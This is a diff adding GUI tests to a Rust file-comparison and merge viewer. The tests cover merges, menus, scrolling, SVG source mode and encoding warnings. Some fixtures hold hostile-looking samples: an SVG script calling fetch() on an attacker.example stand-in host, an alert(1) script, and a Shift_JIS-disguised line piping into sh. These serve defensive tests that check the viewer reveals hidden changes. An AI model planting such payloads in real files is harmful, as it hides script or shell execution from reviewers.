@@ -122,6 +122,22 @@ fn gui_whitespace_keeps_repeated_conflict_choices_separate(cx: &mut TestAppConte
 }
 
 #[gpui::test]
+fn gui_merge_opens_a_change_git_stops_on_as_a_conflict(cx: &mut TestAppContext) {
+    let (dir,viewer)=merge_view::gui_tests::fixture(cx);
+    for (name,text) in [("base","alpha line\n\nbeta line\ndelta line\n"),("ours","alpha line\n\nbeta line\ndelta CHANGED\n"),
+        ("theirs","alpha line\n\nbeta line\n\nbeta line\ndelta line\n")] {
+        std::fs::write(dir.path().join(name),text).unwrap();
+    }
+    let _=std::fs::remove_file(dir.path().join("result"));
+    let opened=crate::merge_session::open_files(&dir.path().join("base"),&dir.path().join("ours"),&dir.path().join("theirs"),&dir.path().join("result"),dir.path()).unwrap();
+    viewer.update(cx,|v,cx|v.start_merge(opened,false,cx));
+    let window=cx.update(|cx|cx.open_window(Default::default(),|_,_|viewer.clone())).unwrap();
+    window.update(cx,|v,w,cx|{let _=v.render(w,cx);}).unwrap();
+    viewer.read_with(cx,|v,_|{let m=v.merge.as_ref().unwrap();assert_eq!(m.m.unresolved(),1);assert!(m.counters().starts_with("1 conflict left"),"{}",m.counters());});
+    assert!(!dir.path().join("result").exists(),"opening writes nothing");
+}
+
+#[gpui::test]
 fn gui_whitespace_output_change_requires_save_before_close(cx: &mut TestAppContext) {
     let (dir,viewer)=merge_view::gui_tests::fixture(cx);
     for (name,text) in [("base","a\n"),("ours"," a\n"),("theirs","a\nb\n")] {
@@ -1003,6 +1019,28 @@ fn poll_list_search(cx:&mut TestAppContext,f:&Fixture) {
 }
 
 #[test]
+fn gui_files_scrollbar_drags_and_pages_the_list_without_opening_a_file() {
+    let mut cx=TestAppContext::single();let f=files_fixture(&mut cx);
+    let (x,(top,h,list),current)=f.viewer.read_with(&cx,|v,_|(v.diff_x()-6.,v.nav_bar().unwrap(),v.comparison.current));
+    assert!(list.total>list.visible&&list.first==0,"{list:?}");
+    let down=|cx:&mut TestAppContext,y:f32|f.window.update(cx,|v,w,cx|v.on_mouse_down(&MouseDownEvent{position:point(px(x),px(y)),button:MouseButton::Left,click_count:1,..Default::default()},w,cx)).unwrap();
+    let moved=|cx:&mut TestAppContext,y:f32|f.window.update(cx,|v,w,cx|v.on_mouse_move(&MouseMoveEvent{position:point(px(x),px(y)),pressed_button:Some(MouseButton::Left),modifiers:Default::default()},w,cx)).unwrap();
+    let scroll=|cx:&TestAppContext|f.viewer.read_with(cx,|v,_|v.nav_scroll);
+    // a press at the track's end brings the thumb there; dragging it to the top returns to the first row
+    down(&mut cx,top+h-2.);
+    assert_eq!(scroll(&cx),(list.total-list.visible) as f32);
+    moved(&mut cx,top+h/2.);
+    assert!(scroll(&cx)>0.&&scroll(&cx)<(list.total-list.visible) as f32);
+    moved(&mut cx,top);
+    f.window.update(&mut cx,|v,w,cx|v.on_mouse_up(&MouseUpEvent{position:point(px(x),px(top)),button:MouseButton::Left,..Default::default()},w,cx)).unwrap();
+    assert_eq!(scroll(&cx),0.);
+    // released: the pointer moves freely again, and no file was opened by the press
+    moved(&mut cx,top+h-2.);
+    assert_eq!(scroll(&cx),0.);
+    assert_eq!(f.viewer.read_with(&cx,|v,_|v.comparison.current),current);
+}
+
+#[test]
 fn gui_file_search_previews_without_loading_and_cancel_restores_scroll() {
     let mut cx=TestAppContext::single();let f=files_fixture(&mut cx);
     let before=f.viewer.update(&mut cx,|v,_| {
@@ -1562,12 +1600,12 @@ fn gui_parity_go_to_unicode_caret_and_keyboard_menu_keep_semantic_positions() {
         "👩"
     );
     key(&mut cx, &f, ":", false, false, false);
-    key(&mut cx, &f, "end", false, false, false);
+    key(&mut cx, &f, "end", false, false, true);
     f.viewer.read_with(&cx, |v, _| {
         let p = v.command_palette.as_ref().unwrap();
         assert_eq!(p.selected(), Some(p.len() - 1));
     });
-    key(&mut cx, &f, "home", false, false, false);
+    key(&mut cx, &f, "home", false, false, true);
     key(&mut cx, &f, "pagedown", false, false, false);
     assert!(
         f.viewer
@@ -3538,6 +3576,89 @@ fn gui_text_context_menu_lists_only_what_is_under_the_pointer(cx:&mut TestAppCon
 }
 
 #[gpui::test]
+fn gui_hunk_menu_rejects_replaced_diff_and_fresh_actions_work(cx: &mut TestAppContext) {
+    let left = "space\nsecond\nkeep1\nkeep2\nkeep3\nold1\nold2\n";
+    let right = "space \nsecond \nkeep1\nkeep2\nkeep3\nnew1\nnew2\n";
+    for fold in [false, true] {
+        let f = fixture(cx, left, right);
+        let is_action = |action: &MenuAction| match action {
+            MenuAction::Fold(_) => fold,
+            MenuAction::Move(_, Side::Right) => !fold,
+            _ => false,
+        };
+        f.window.update(cx, |v, w, cx| {
+            let _ = v.render(w, cx);
+            assert_eq!(v.comparison.view.change_count(), 2);
+            // The request is new, but the visible hunk indices still belong to the old diff.
+            v.on_key(&event("w", false, false, false), w, cx);
+            assert_eq!(v.comparison.options.whitespace, WhitespaceMode::Trim);
+            assert_ne!(v.comparison.generation, v.comparison.diffed);
+            let (x, y) = v.point_on_line(w, Side::Right, 0);
+            v.on_right_down(&MouseDownEvent {
+                position: point(px(x), px(y)), button: MouseButton::Right, ..Default::default()
+            }, w, cx);
+            let menu = v.menu.as_mut().unwrap();
+            menu.hover = Some(menu.items.iter().position(|(_, action)| is_action(action)).unwrap());
+        }).unwrap();
+        workflow_wait(cx, &f, |v| v.comparison.diffed == v.comparison.generation);
+        assert_eq!(f.viewer.read_with(cx, |v, _| v.comparison.view.change_count()), 1);
+        key(cx, &f, "enter", false, false, false);
+        f.viewer.read_with(cx, |v, _| {
+            assert_eq!(v.doc().unwrap().text(Side::Right), right, "a stale menu must not apply the remaining unrelated hunk");
+            assert!(!v.edits.has_dirty());
+            assert!(!v.comparison.view.folded(0), "a stale menu must not fold the remaining unrelated hunk");
+            assert!(v.toast.as_ref().is_some_and(|t| t.0 == "Comparison changed — reopen the menu"));
+        });
+        assert_eq!(text(&f), right);
+
+        // Reopening the menu on the surviving hunk makes the same actions usable again.
+        f.window.update(cx, |v, w, cx| {
+            let (x, y) = v.point_on_line(w, Side::Right, 5);
+            v.on_right_down(&MouseDownEvent {
+                position: point(px(x), px(y)), button: MouseButton::Right, ..Default::default()
+            }, w, cx);
+            let menu = v.menu.as_mut().unwrap();
+            menu.hover = Some(menu.items.iter().position(|(_, action)| is_action(action)).unwrap());
+        }).unwrap();
+        key(cx, &f, "enter", false, false, false);
+        if fold {
+            assert!(f.viewer.read_with(cx, |v, _| v.comparison.view.folded(0)));
+            assert_eq!(text(&f), right);
+        } else {
+            let expected = "space \nsecond \nkeep1\nkeep2\nkeep3\nold1\nold2\n";
+            assert_eq!(f.viewer.read_with(cx, |v, _| v.doc().unwrap().text(Side::Right).to_owned()), expected);
+            assert_eq!(text(&f), right, "the valid menu move changes only the draft until Save");
+            key(cx, &f, "s", true, false, false);
+            assert_eq!(text(&f), expected);
+        }
+    }
+}
+
+#[gpui::test]
+fn gui_hunk_menu_saved_action_rejects_reloaded_document(cx: &mut TestAppContext) {
+    let f = fixture(cx, "left\n", "old right\n");
+    let menu = f.window.update(cx, |v, w, cx| {
+        let _ = v.render(w, cx);
+        let (x, y) = v.point_on_line(w, Side::Right, 0);
+        v.on_right_down(&MouseDownEvent {
+            position: point(px(x), px(y)), button: MouseButton::Right, ..Default::default()
+        }, w, cx);
+        let mut menu = v.menu.take().unwrap();
+        menu.hover = Some(menu.items.iter().position(|(_, action)| matches!(action, MenuAction::Move(_, Side::Right))).unwrap());
+        menu
+    }).unwrap();
+    std::fs::write(f.dir.path().join("right.txt"), "fresh right\n").unwrap();
+    run(cx, &f, crate::catalog::Action::Interaction(commands::Interaction::Reload));
+    workflow_wait(cx, &f, |v| v.doc().is_some() && v.comparison.diffed == v.comparison.generation);
+    // Even a retained action cannot use the new document's block at the same index.
+    f.viewer.update(cx, |v, _| v.menu = Some(menu));
+    key(cx, &f, "enter", false, false, false);
+    assert_eq!(f.viewer.read_with(cx, |v, _| v.doc().unwrap().text(Side::Right).to_owned()), "fresh right\n");
+    assert!(!f.viewer.read_with(cx, |v, _| v.edits.has_dirty()));
+    assert_eq!(text(&f), "fresh right\n");
+}
+
+#[gpui::test]
 fn gui_single_line_block_has_no_fold_item(cx:&mut TestAppContext) {
     let f=fixture(cx,"a\nb\nkeep\n","a\nB\nkeep\n");
     let labels=right_click_labels(cx,&f,Side::Right,1);
@@ -3557,6 +3678,99 @@ fn gui_image_header_switch_offers_and_sets_the_modes(cx:&mut TestAppContext) {
     click(cx,&f,x,y);
     assert_eq!(f.viewer.read_with(cx,|v,_|v.iview.state().mode()),crate::image_session::Mode::Difference);
     assert!(f.viewer.read_with(cx,|v,_|v.header_switch().iter().any(|c|c.2=="Difference"&&c.3)));
+}
+
+const SVG:&str="<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\">\n<rect width=\"16\" height=\"16\" fill=\"#f00\"/>\n</svg>\n";
+
+#[gpui::test]
+fn gui_svg_source_mode_shows_a_change_its_rendering_does_not(cx:&mut TestAppContext) {
+    use crate::image_session::Mode;
+    let script=SVG.replace("</svg>","<script>fetch(\"https://attacker.example.invalid/\")</script>\n</svg>");
+    let f=fixture_named(cx,SVG,&script,"svg");
+    workflow_wait(cx,&f,|v|v.image_doc().is_some());
+    assert_eq!(f.window.update(cx,|v,w,cx|{let _=v.render(w,cx);v.header_switch_labels()}).unwrap(),["2-up","Swipe","Onion skin","Difference","Source"]);
+    f.viewer.read_with(cx,|v,_|{
+        let doc=v.doc().unwrap();
+        assert!(!doc.content_identical(),"0 px changed, but the bytes differ");
+        assert!(doc.notes.iter().any(|n|n.contains("source differs")),"{:?}",doc.notes);
+        assert_eq!(v.interaction_disabled(commands::Interaction::Find),Some("Not a text comparison"),"the rendering is on screen");
+    });
+    let (x,y)=f.viewer.read_with(cx,|v,_|{let cell=v.header_switch().into_iter().find(|c|c.2=="Source").unwrap();(cell.0+cell.1/2.,v.top()-hdr_h()/2.)});
+    click(cx,&f,x,y);
+    workflow_wait(cx,&f,|v|v.comparison.diffed==v.comparison.generation);
+    f.viewer.read_with(cx,|v,_|{
+        assert_eq!(v.iview.state().mode(),Mode::Source);
+        assert!(v.image_doc().is_none()&&v.rendering_doc().is_some());
+        assert!(v.doc().unwrap().lines_on(Side::Right).iter().any(|l|l.starts_with("<script>fetch(")));
+        assert_eq!(v.comparison.view.block_ranges().len(),1,"the added line is a change block");
+        assert_eq!(v.interaction_disabled(commands::Interaction::Find),None);
+        assert!(v.header_switch().iter().any(|c|c.2=="Source"&&c.3));
+    });
+    // a diff option re-diffs the source and keeps it on screen
+    f.window.update(cx,|v,w,cx|v.run_action(crate::catalog::Action::Comparison(commands::Command::SetWhitespace(lenz_engine::WhitespaceMode::Ignore)),w,cx)).unwrap();
+    workflow_wait(cx,&f,|v|v.comparison.diffed==v.comparison.generation);
+    assert!(f.viewer.read_with(cx,|v,_|v.iview.state().mode()==Mode::Source&&v.image_doc().is_none()&&v.comparison.view.block_ranges().len()==1));
+    // back to the rendering
+    let (x,y)=f.viewer.read_with(cx,|v,_|{let cell=v.header_switch().into_iter().find(|c|c.2=="2-up").unwrap();(cell.0+cell.1/2.,v.top()-hdr_h()/2.)});
+    click(cx,&f,x,y);
+    assert!(f.viewer.read_with(cx,|v,_|v.image_doc().is_some()));
+}
+
+#[gpui::test]
+fn gui_an_svg_that_cannot_be_drawn_shows_its_text_and_says_why(cx:&mut TestAppContext) {
+    let broken=SVG.replace("width=\"16\" height=\"16\">","width=\"0\" height=\"0\">").replace("</svg>","<script>alert(1)</script>\n</svg>");
+    let f=fixture_named(cx,SVG,&broken,"svg");
+    f.viewer.read_with(cx,|v,_|{
+        let doc=v.doc().unwrap();
+        assert!(v.rendering_doc().is_none()&&doc.placeholder.is_none());
+        assert!(doc.lines_on(Side::Right).iter().any(|l|l=="<script>alert(1)</script>"));
+        assert!(doc.notes.iter().any(|n|n.starts_with("cannot show as an image")));
+        assert!(!doc.content_identical());
+    });
+    // empty text in place of differing binary Sides is not identical content either
+    let (lp,rp)=(f.dir.path().join("old.bin"),f.dir.path().join("new.bin"));
+    std::fs::write(&lp,b"\0one").unwrap();std::fs::write(&rp,b"\0two").unwrap();
+    let set=ChangeSet::load(&Spec::Plain{left:lp.clone(),right:rp.clone()},f.dir.path()).unwrap();
+    let binary=Doc::load(&set,0,&lp,&rp,false).unwrap();
+    assert!(binary.placeholder.is_some()&&!binary.content_identical());
+}
+
+#[gpui::test]
+fn gui_status_says_when_highlighting_stopped_at_its_time_limit(cx:&mut TestAppContext) {
+    use crate::highlight::{LIMIT_NOTE, Parsed};
+    let f=fixture_named(cx,"fn a() {}\n","fn b() {}\n","rs");
+    let window=f.window;
+    window.update(cx,|v,w,cx|{let _=v.render(w,cx);}).unwrap(); // the first render starts the parse
+    cx.executor().run_until_parked();
+    assert!(f.viewer.read_with(cx,|v,_|v.loaded.get(&v.comparison.current).is_some_and(|l|l.parsed.iter().all(Option::is_some))));
+    assert!(!f.viewer.read_with(cx,|v,_|v.status_notes()).iter().any(|n|n==LIMIT_NOTE));
+    // the syntax worker's answer for a Side that stopped at the limit
+    f.viewer.update(cx,|v,_|{let current=v.comparison.current;v.loaded.get_mut(&current).unwrap().parsed[1]=Some(Arc::new(Parsed::limited_plain("fn b() {}\n")));});
+    window.update(cx,|v,w,cx|{let _=v.render(w,cx);}).unwrap();
+    assert_eq!(f.viewer.read_with(cx,|v,_|v.status_notes()).iter().filter(|n|*n==LIMIT_NOTE).count(),1);
+    // the Merge View says it for its own panes
+    for (name,text) in [("base.rs","fn a() {}\n"),("ours.rs","fn b() {}\n"),("theirs.rs","fn c() {}\n")] {std::fs::write(f.dir.path().join(name),text).unwrap();}
+    let d=f.dir.path();
+    let opened=crate::merge_session::open_files(&d.join("base.rs"),&d.join("ours.rs"),&d.join("theirs.rs"),&d.join("result.rs"),d).unwrap();
+    f.viewer.update(cx,|v,cx|v.start_merge(opened,false,cx));
+    assert!(!f.viewer.read_with(cx,|v,_|v.status_notes()).iter().any(|n|n==LIMIT_NOTE),"the merge's notes replace the comparison's");
+    f.viewer.update(cx,|v,_|v.merge.as_mut().unwrap().parsed[0]=Some(Arc::new(Parsed::limited_plain("fn b() {}\n"))));
+    assert!(f.viewer.read_with(cx,|v,_|v.status_notes()).iter().any(|n|n==LIMIT_NOTE));
+    assert!(!d.join("result.rs").exists());
+}
+
+#[gpui::test]
+fn gui_status_says_when_a_guessed_encoding_hides_ascii_bytes(cx:&mut TestAppContext) {
+    let f=fixture(cx,"a\n","b\n");
+    let (lp,rp)=(f.dir.path().join("old.sh"),f.dir.path().join("new.sh"));
+    // "# 設定を表示" in Shift_JIS, then a pipe after a lead byte that the guess reads as one katakana
+    let comment=b"# \x90\xDD\x92\xE8\x82\xF0\x95\x5C\x8E\xA6\n";
+    std::fs::write(&lp,[&comment[..],b"echo safe\n"].concat()).unwrap();
+    std::fs::write(&rp,[&comment[..],b"printf '%s\\n' 'echo X' \x83| sh\n"].concat()).unwrap();
+    let spec=Spec::Plain{left:lp,right:rp};let set=ChangeSet::load(&spec,f.dir.path()).unwrap();
+    f.viewer.update(cx,|v,cx|{v.spec=spec;v.show_change_set(set,cx);});
+    workflow_wait(cx,&f,|v|v.doc().is_some_and(|d|d.lines_on(Side::Right).len()>1));
+    assert!(f.viewer.read_with(cx,|v,_|v.doc().unwrap().notes.iter().any(|n|n==crate::encoding::HIDES_ASCII_NOTICE)));
 }
 
 #[gpui::test]
@@ -3580,14 +3794,18 @@ fn gui_app_menu_lists_settings_theme_keys_about_and_report(cx:&mut TestAppContex
     let (f,_repo)=repository_fixture(cx);
     f.window.update(cx,|v,w,cx|v.tool(Tool::AppMenu,900.,w,cx)).unwrap();
     let labels=f.viewer.read_with(cx,|v,_|v.menu.as_ref().unwrap().items.iter().map(|(l,_)|l.clone()).collect::<Vec<_>>());
-    assert_eq!(labels,["Settings…",commands::Interaction::ChangeTheme.label(),"Keyboard shortcuts",commands::Interaction::About.label(),commands::Interaction::ReportLastError.label()]);
+    assert_eq!(labels,["New Comparison…","Settings…",commands::Interaction::ChangeTheme.label(),"Keyboard shortcuts",commands::Interaction::About.label(),commands::Interaction::ReportLastError.label()]);
     assert!(f.viewer.read_with(cx,|v,_|v.toolbar_slots().iter().any(|s|s.id=="app-menu"&&s.active)),"the open menu marks its button");
-    key(cx,&f,"home",false,false,false);key(cx,&f,"down",false,false,false);key(cx,&f,"down",false,false,false);key(cx,&f,"enter",false,false,false);
+    key(cx,&f,"home",false,false,false);key(cx,&f,"down",false,false,false);key(cx,&f,"down",false,false,false);key(cx,&f,"down",false,false,false);key(cx,&f,"enter",false,false,false);
     assert!(f.viewer.read_with(cx,|v,_|v.help),"Keyboard shortcuts opens help");
     key(cx,&f,"escape",false,false,false);
     f.window.update(cx,|v,w,cx|v.tool(Tool::AppMenu,900.,w,cx)).unwrap();
     f.window.update(cx,|v,w,cx|v.tool(Tool::AppMenu,900.,w,cx)).unwrap();
     assert!(f.viewer.read_with(cx,|v,_|v.menu.is_none()),"the button toggles its menu");
+    f.window.update(cx,|v,w,cx|v.tool(Tool::AppMenu,900.,w,cx)).unwrap();
+    key(cx,&f,"home",false,false,false);key(cx,&f,"enter",false,false,false);
+    assert!(f.viewer.read_with(cx,|v,_|v.spawned_comparisons.last().is_some_and(|(args,_)|args==&["--new-comparison"])));
+
 }
 
 #[gpui::test]
@@ -4300,7 +4518,16 @@ fn check_shortcuts(cx:&mut TestAppContext,make:&dyn Fn(&mut TestAppContext)->Fix
         let (k,c)=(by_key.viewer.read_with(cx,|v,_|fingerprint(v)),by_cmd.viewer.read_with(cx,|v,_|fingerprint(v)));
         let untouched=probe.viewer.read_with(cx,|v,_|fingerprint(v));
         if k!=c {wrong.push(format!("{shortcut} for {:?} ({}) — key changed {}",e.action,e.label,if k==untouched {"nothing"} else {"something else"}));}
+        // TestAppContext retains windows until they close. Retire each pair (and
+        // any auxiliary windows its actions opened) before constructing another.
+        let keep = probe.window.window_id();
+        for window in cx.update(|cx|cx.windows()) {
+            if window.window_id() != keep { let _ = window.update(cx,|_,w,_|w.remove_window()); }
+        }
+        drop(by_key); drop(by_cmd);
+        cx.executor().run_until_parked();
     }
+    let _ = probe.window.update(cx,|_,w,_|w.remove_window());
 }
 
 #[gpui::test]
@@ -5029,4 +5256,21 @@ fn gui_summary_scrolled_header_click_only_focuses(cx: &mut TestAppContext) {
         assert!(f.viewer.read_with(cx, |v, _| v.summary_shown()), "header and gap must not open a file");
         assert_eq!(f.viewer.read_with(cx, |v, _| v.comparison.folders.summary().unwrap().selected), 59);
     }
+}
+
+#[gpui::test]
+fn gui_popup_fields_edit_unicode_ranges_and_clipboard(cx:&mut TestAppContext){
+    let f=fixture(cx,"old\n","new\n");
+    for kind in [Modal::GoTo,Modal::Switcher,Modal::Find]{
+        f.viewer.update(cx,|v,_|{v.goto=None;v.switcher=None;v.comparison.find=None;match kind {Modal::GoTo=>v.goto=Some("one é👩🏽‍💻 two".into()),Modal::Switcher=>{v.switcher=Some(Switcher{query:"one é👩🏽‍💻 two".into(),selected:0,hits:Vec::new()});v.update_switcher();},Modal::Find=>v.open_find(),_=>unreachable!()}});
+        if kind==Modal::Find {f.viewer.update(cx,|v,_|v.comparison.find.as_mut().unwrap().query="one é👩🏽‍💻 two".into());}
+        key(cx,&f,"home",false,false,false);key(cx,&f,"right",true,false,false);key(cx,&f,"right",false,false,false);
+        for _ in 0..2{key(cx,&f,"right",false,true,false);}
+        key(cx,&f,"c",true,false,false);
+        assert_eq!(cx.update(|cx|cx.read_from_clipboard().and_then(|c|c.text())).as_deref(),Some("é👩🏽‍💻"));
+        key(cx,&f,"x",true,false,false);
+        f.viewer.read_with(cx,|v,_|{let value=match kind{Modal::GoTo=>v.goto.as_ref().unwrap(),Modal::Switcher=>&v.switcher.as_ref().unwrap().query,_=>&v.comparison.find.as_ref().unwrap().query};assert_eq!(value,"one  two");});
+        key(cx,&f,"v",true,false,false);key(cx,&f,"escape",false,false,false);
+    }
+    assert_eq!(text(&f),"new\n");assert!(!f.viewer.read_with(cx,|v,_|v.edits.has_dirty()));
 }
